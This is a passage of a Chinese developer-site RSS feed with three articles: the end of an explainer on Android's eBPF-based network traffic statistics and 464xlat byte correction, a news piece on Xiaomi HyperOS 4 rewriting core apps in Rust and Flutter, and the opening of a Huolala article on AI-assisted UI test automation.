<h3 data-id="heading-18"><strong>内核实现</strong></h3>
<pre><code class="hljs language-37:53:packages_modules_Connectivity/netd/BpfHandler.h" lang="37:53:packages_modules_Connectivity/netd/BpfHandler.h">     * Tag the socket with the specified tag and uid. In the qtaguid module, the
     * first tag request that grab the spinlock of rb_tree can update the tag
     * information first and other request need to wait until it finish. All the
     * tag request will be addressed in the order of they obtaining the spinlock.
     * In the eBPF implementation, the kernel will try to update the eBPF map
     * entry with the tag request. And the hashmap update process is protected by
     * the spinlock initialized with the map. So the behavior of two modules
     * should be the same. No additional lock needed.
     */
    int tagSocket(int sockFd, uint32_t tag, uid_t chargeUid, uid_t realUid);

    /*
     * The untag process is similar to tag socket and both old qtaguid module and
     * new eBPF module have spinlock inside the kernel for concurrent update. No
     * external lock is required.
     */
    int untagSocket(int sockFd);
</code></pre>
<hr/>
<h2 data-id="heading-19">5️⃣ <strong>464xlat 流量校正</strong></h2>
<h3 data-id="heading-20"><strong>问题背景</strong></h3>
<p>在 IPv4-only App 通过 464xlat 使用 IPv6-only 网络时，会出现流量统计偏差：</p>
<ul>
<li><strong>IPv4 包头</strong>：20 字节</li>
<li><strong>IPv6 包头</strong>：40 字节</li>
<li><strong>差异</strong>：每个包多 20 字节</li>
</ul>
<h3 data-id="heading-21"><strong>校正机制</strong></h3>
<pre><code class="hljs language-1181:1230:packages_modules_Connectivity/framework-t/src/android/net/NetworkStats.java" lang="1181:1230:packages_modules_Connectivity/framework-t/src/android/net/NetworkStats.java">    /**
     * Calculate and apply adjustments to captured statistics for 464xlat traffic.
     *
     * &lt;p&gt;This mutates stacked traffic stats, to account for IPv4/IPv6 header size difference.
     *
     * &lt;p&gt;UID stats, which are only accounted on the stacked interface, need to be increased
     * by 20 bytes/packet to account for translation overhead.
     *
     * &lt;p&gt;The potential additional overhead of 8 bytes/packet for ip fragments is ignored.
     *
     * &lt;p&gt;Interface stats need to sum traffic on both stacked and base interface because:
     *   - eBPF offloaded packets appear only on the stacked interface
     *   - Non-offloaded ingress packets appear only on the stacked interface
     *     (due to iptables raw PREROUTING drop rules)
     *   - Non-offloaded egress packets appear only on the stacked interface
     *     (due to ignoring traffic from clat daemon by uid match)
     * (and of course the 20 bytes/packet overhead needs to be applied to stacked interface stats)
     *
     * &lt;p&gt;This method will behave fine if {@code stackedIfaces} is an non-synchronized but add-only
     * {@code ConcurrentHashMap}
     * @param baseTraffic Traffic on the base interfaces. Will be mutated.
     * @param stackedTraffic Stats with traffic stacked on top of our ifaces. Will also be mutated.
     * @param stackedIfaces Mapping ipv6if -&gt; ipv4if interface where traffic is counted on both.
     * @hide
     */
    public static void apply464xlatAdjustments(NetworkStats baseTraffic,
            NetworkStats stackedTraffic, Map&lt;String, String&gt; stackedIfaces) {
        // For recycling
        Entry entry = null;
        for (int i = 0; i &lt; stackedTraffic.size; i++) {
            entry = stackedTraffic.getValues(i, entry);
            if (entry == null) continue;
            if (entry.iface == null) continue;
            if (!entry.iface.startsWith(CLATD_INTERFACE_PREFIX)) continue;

            // For 464xlat traffic, per uid stats only counts the bytes of the native IPv4 packet
            // sent on the stacked interface with prefix "v4-" and drops the IPv6 header size after
            // unwrapping. To account correctly for on-the-wire traffic, add the 20 additional bytes
            // difference for all packets (http://b/12249687, http:/b/33681750).
            //
            // Note: this doesn't account for LRO/GRO/GSO/TSO (ie. &gt;mtu) traffic correctly, nor
            // does it correctly account for the 8 extra bytes in the IPv6 fragmentation header.
            //
            // While the ebpf code path does try to simulate proper post segmentation packet
            // counts, we have nothing of the sort of xt_qtaguid stats.
            entry.rxBytes += entry.rxPackets * IPV4V6_HEADER_DELTA;
            entry.txBytes += entry.txPackets * IPV4V6_HEADER_DELTA;
            stackedTraffic.setValues(i, entry);
        }
    }
</code></pre>
<hr/>
<h2 data-id="heading-22">📈 <strong>统计维度总结</strong></h2>








































<table><thead><tr><th>维度</th><th>说明</th><th>API</th></tr></thead><tbody><tr><td><strong>UID</strong></td><td>按应用程序统计</td><td><code>TrafficStats.getUidTxBytes(uid)</code></td></tr><tr><td><strong>Tag</strong></td><td>按 Socket 标签统计</td><td><code>TrafficStats.setThreadStatsTag()</code></td></tr><tr><td><strong>Interface</strong></td><td>按网卡接口统计（rmnet0, wlan0 等）</td><td><code>TrafficStats.getTxBytes(iface)</code></td></tr><tr><td><strong>Set</strong></td><td>前台/后台流量分离</td><td><code>NetworkStats.SET_FOREGROUND</code></td></tr><tr><td><strong>Network</strong></td><td>按网络类型（WiFi, 移动数据）</td><td><code>NetworkStatsManager.queryDetails()</code></td></tr><tr><td><strong>Time</strong></td><td>按时间段查询历史数据</td><td><code>NetworkStatsManager</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-23">🎯 <strong>实战场景</strong></h2>
<h3 data-id="heading-24">1. <strong>数据用量监控 App</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">NetworkStatsManager</span> <span class="hljs-variable">statsManager</span> <span class="hljs-operator">=</span> context.getSystemService(NetworkStatsManager.class);
<span class="hljs-type">NetworkStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> statsManager.queryDetails(
    ConnectivityManager.TYPE_MOBILE, 
    subscriberId,
    startTime, 
    endTime
);
</code></pre>
<h3 data-id="heading-25">2. <strong>防火墙 App（限制后台流量）</strong></h3>
<p>通过设置 <code>uid_counterset_map</code>，将 UID 标记为 <code>SET_DEFAULT</code> 或 <code>SET_FOREGROUND</code>。</p>
<h3 data-id="heading-26">3. <strong>流量统计 Widget</strong></h3>
<p>实时显示当前 App 的上传/下载速度。</p>
<hr/>
<h2 data-id="heading-27">⚡ <strong>性能优化</strong></h2>
<ol>
<li><strong>eBPF Zero-Copy</strong>：内核态数据直接映射到用户态，无需拷贝</li>
<li><strong>双缓冲机制</strong>：读写分离的 Stats Map（Map A / Map B）</li>
<li><strong>缓存机制</strong>：TrafficStats 结果缓存 1 秒，避免频繁 IPC</li>
<li><strong>增量更新</strong>：只记录变化量，减少存储空间</li>
</ol>
<hr/>
<p>希望这份详尽的解析帮助您深入理解了 Android 网络流量统计的完整架构！从内核 eBPF 到应用层 API，Android 构建了一套高效、准确、灵活的流量监控体系。如果您想深入研究某个具体部分（如 eBPF 程序编写、NetworkStatsService 的持久化机制、或流量告警的实现），随时告诉我！📊🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[小米 HyperOS 4 大变样？核心应用以 Rust / Flutter 重写，不兼容老系统]]></title>    <link>https://juejin.cn/post/7602512064977207359</link>    <guid>https://juejin.cn/post/7602512064977207359</guid>    <pubDate>2026-02-04T04:29:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602512064977207359" data-draft-id="7602512064977190975" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="小米 HyperOS 4 大变样？核心应用以 Rust / Flutter 重写，不兼容老系统"/> <meta itemprop="keywords" content="前端,Flutter,Android"/> <meta itemprop="datePublished" content="2026-02-04T04:29:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="恋猫de小郭"/> <meta itemprop="url" content="https://juejin.cn/user/817692379985752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            小米 HyperOS 4 大变样？核心应用以 Rust / Flutter 重写，不兼容老系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692379985752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    恋猫de小郭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T04:29:58.000Z" title="Wed Feb 04 2026 04:29:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    480
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今日，xiaomi time 发布了相关表示，<strong>HyperOS 4 将是小米历史上最稳定的更新</strong>，当然这不是重点，重点是根据近期 HyperOS 3.1 版本，可以看到对应的应用架构出现了变化，小米正在分阶段弃用对应的旧版代码架构，例如：</p>
<blockquote>
<p>HyperOS 3.1 开始移除部分系统模块（特别是天气和图库）中的 <code>MIUI SDK</code> 。</p>
</blockquote>
<p>以 HyperOS 3.1 作为过渡版本，通过引入了原生 <code>HyperOS SDK</code> 以及已弃用的 <code>MIUI SDK</code> ，未来 HyperOS 4 预计将通过彻底移除向后兼容层来完成这一迁移。</p>
<blockquote>
<p>这一转变预计可以消除十多年来冗余的函数调用和未优化的依赖链。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82cc8a0de3c1486b83044c083eb3c34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=bIUVpKYH8pmBQDYnRgkVJbn9tWc%3D" alt="image-20260204121849635" loading="lazy"/></p>
<p>当然，最有意思的还是，针对系统核心应用，<strong>HyperOS 已经在使用 Flutter 和 Rust 重写，目前已在 HyperOS 3.1 中进行试点</strong> ，按照它的说法：</p>
<blockquote>
<p>HyperOS 4 旨在统一系统分区内的 UI 渲染和逻辑稳定性，从而取代之前 MIUI 版本中碎片化的 Java/Kotlin 遗留架构。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/327855b295de4b4cbae7c4c94c348874~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=vQYq70PPQCR7TF7TroFW3yD1INU%3D" alt="" loading="lazy"/></p>
<p>当然，这算是一个大的 break change ，从 HyperOS 3.1 开始，基于 Flutter 的应用会打破之前旧系统可以升级新系统应用的情况，因为新的 HyperOS 4 Flutter 应用会无法在 HyperOS 3 及更早版本上运行。</p>
<blockquote>
<p>注意，这里说的是用来的新 Hyper SDK 的系统核心应用。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a0d52c82ee741e5a8046e7e4059d82e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=0SN4VDkvTHGW2o1Fe7U9kLNYivk%3D" alt="" loading="lazy"/></p>
<p>其实对比新旧的相册应用也可以看出来，图一是 4.x 版本， 而图而是 5.0-R 的版本，新版本在 libchecker 下已经看不到相应的 Kotlin 信息了，甚至没有了对应的 dex 目录，只有原生动态库 ：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05dc413bd67c4a6491b166afbaecc074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=%2FVvqH%2FmXcjI4XAsTgfK7D8w53ZQ%3D" alt="" loading="lazy"/></p>
<p>另外，也有网友分析了他内部的依赖，可以看到 hyper 相关的实现不少，应该是 HyperSDK 提供：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8daf5f65615b45488f53f0da388944e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=cVtIfpmP2KquOLi8SGrbeJgbkek%3D" alt="" loading="lazy"/></p>
<p>当然，xiaomi time 也表示，旗舰级机型在 HyperOS 4 上性能提升幅度有限，相反入门级和中端设备反而可能获得更显著的性能提升，因为技术债务的消除，也可以节省更多的空间。</p>
<p>当然，也有人猜测这个操作是为了提前布局，例如：</p>
<ul>
<li>小米有很多不同平台的产品，用 flutter 可以做到不同平台的产品也可以跨平台，也就是核心系统应用未来有可能出现在其他平台上，比如汽车，眼镜等</li>
</ul>

<ul>
<li>小米打算走和华为一样的路线，华为早期也是通过 flutter 做 UI 层兼容抽象，通过 flutter ，如果后续小米有独立系统发布，应用支持可以更方便直接i迁移， 因为 flutter 只需要适配嵌入层和 vulkan 就可以无缝适配</li>
</ul>
<p>不过这些都只是猜测，而从目前的情况来看，这个决策应该是真的，只是带来的影响如何，只能等官方正式发布后看看了。</p>
<h2 data-id="heading-0">参考链接</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fxiaomitime.com%2Fwhy-hyperos-4-will-be-the-most-stable-update-in-xiaomi-history-88033%2F" target="_blank" title="https://xiaomitime.com/why-hyperos-4-will-be-the-most-stable-update-in-xiaomi-history-88033/" ref="nofollow noopener noreferrer">xiaomitime.com/why-hyperos…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[货拉拉UI自动化新范式：从人工维护到AI自愈]]></title>    <link>https://juejin.cn/post/7602472997921505280</link>    <guid>https://juejin.cn/post/7602472997921505280</guid>    <pubDate>2026-02-04T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602472997921505280" data-draft-id="7602146335216615464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="货拉拉UI自动化新范式：从人工维护到AI自愈"/> <meta itemprop="keywords" content="测试"/> <meta itemprop="datePublished" content="2026-02-04T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="货拉拉技术"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            货拉拉UI自动化新范式：从人工维护到AI自愈
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    货拉拉技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:58:31.000Z" title="Wed Feb 04 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    159
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作者介绍：胡嘉椿，来自货拉拉/技术中心/质量保障部，专注于移动测试效能方向。</p>
</blockquote>
<h2 data-id="heading-0">一、背景与挑战</h2>
<p>在移动端测试中，我们始终面对着同一个核心挑战：<strong>如何持续降低手工测试的工作量？</strong> 为此，我们团队已经建立起两条成熟的创新提效路径：</p>
<ol>
